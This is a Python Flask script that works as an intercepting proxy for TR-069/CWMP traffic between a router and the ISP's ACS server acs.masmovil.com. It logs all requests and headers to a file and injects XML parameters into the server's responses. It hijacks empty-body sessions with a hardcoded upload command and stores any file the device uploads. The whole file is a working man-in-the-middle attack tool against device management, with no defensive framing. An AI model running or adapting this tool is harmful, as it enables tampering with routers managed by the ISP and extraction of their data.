from flask import Flask, make_response, request
from flask.logging import create_logger
import logging
import requests
import json
import re

app = Flask(__name__)
#logging.basicConfig(filename='app.log', level=logging.DEBUG)
logging.basicConfig(level=logging.DEBUG)
LOG = create_logger(app)


local_domain = "0.0.0.0"
local_port = 10301

flow_diverted = 0
remote_proto = 'http'
remote_domain = 'acs.masmovil.com'
remote_port = 10301  # 10302 for https


@app.route("/<path:path>", methods=["GET", "POST"])
def hello(path):
    global flow_diverted

    with open("report.txt", "a") as report:
        report.write("--- Request:\n")

        try:
            LOG.info('Request received.')

            report.write("{} {}\n".format(request.method, request.full_path))

            # Fill-in request headers, and determine host:path address
            call_headers = {}
            for header in request.headers:
                name = header[0]
                value = header[1]
                report.write("{}: {}\n".format(name, value))

                if name == "Host":
                    continue
                else:
                    call_headers[name] = value

            # show_params(request.data.decode('utf-8'))

            report.write("\n{}\n".format(request.data.decode('utf-8')))

            # If request body is empty, divert the flow to inject
            # our custom response.
            if request.content_length == 0:
                flow_diverted = 1
                return harcoded_response()

            # Abruptly end a diverted flow
            if flow_diverted == 1:
                LOG.warning("End of diverted flow.")
                return make_response("Error", 500)

            # Otherwise, send the request to ACS
            dest_path = "{}://{}:{}{}".format(remote_proto,
                                              remote_domain,
                                              remote_port,
                                              request.full_path)

            # Call to service
            if request.method == 'GET':
                response = requests.get(dest_path, headers=request.headers)

            elif request.method == 'POST':
                response = requests.post(dest_path,
                                         data=request.data,
                                         headers=request.headers)

            # Process response
            LOG.info('Request forwarded.')
            report.write("\n--- Response:\n{}\n".format(response.status_code))

            # Copy and write down headers
            response_headers = {}
            for header in response.headers:
                value = response.headers.get(header)
                response_headers[header] = value
                report.write("{}: {}\n".format(header, value))

            # Mangle response
            t = response.text
            t = alter_response(t)
            # show_params(t)

            # Write down response and forward it
            report.write("\n{}\n\n".format(t))

            return make_response(
                t,
                response.status_code,
                response_headers)

        except Exception as e:
            LOG.error("Exception: {}".format(e))
            report.write("Exception: {}\n".format(e))
            return make_response("Not found", 404)


@app.route("/<path:path>", methods=["PUT"])
def receivefile(path):
    LOG.info("Getting file")
    with open('uploaded_file', 'wb') as f:
        f.write(request.stream.read())
    return make_response("Ok", 200)


def load_file(file):
    with open(file, "r") as fileh:
        return fileh.read()


def alter_response(t):
    anchor = "</ParameterValueStruct><ParameterValueStruct>"
    anchor2 = "cwmp:ParameterValueStruct[2]"
    newtext = load_file("injectiondata.xml")
    newtext2 = "cwmp:ParameterValueStruct[7]"
    if anchor in t and anchor2 in t:
        LOG.warning("Response altered")
        new = t.replace(anchor, newtext)
        new = new.replace(anchor2, newtext2)
        return new
    else:
        return t


def show_params(t):
    if t is None:
        return

    # too lazy to parse xml
    if "SetParameterValues" in t:
        d = "->"
    elif "GetParameterValuesResponse" in t:
        d = "<-"
    else:
        return

    for n, v in re.findall("<Name>([^<]+).*?<Value[^>]*>([^<]+)", t, re.DOTALL):
        LOG.debug("{} {}: {}".format(d, n, v))


def harcoded_response():
    headers = {"Content-Type": "text/xml; charset=\"UTF-8\""}
    text = load_file("uploadcommand2.xml")
    return make_response(text, 200, headers)


if __name__ == "__main__":
    app.run(host=local_domain, port=local_port, debug=False)
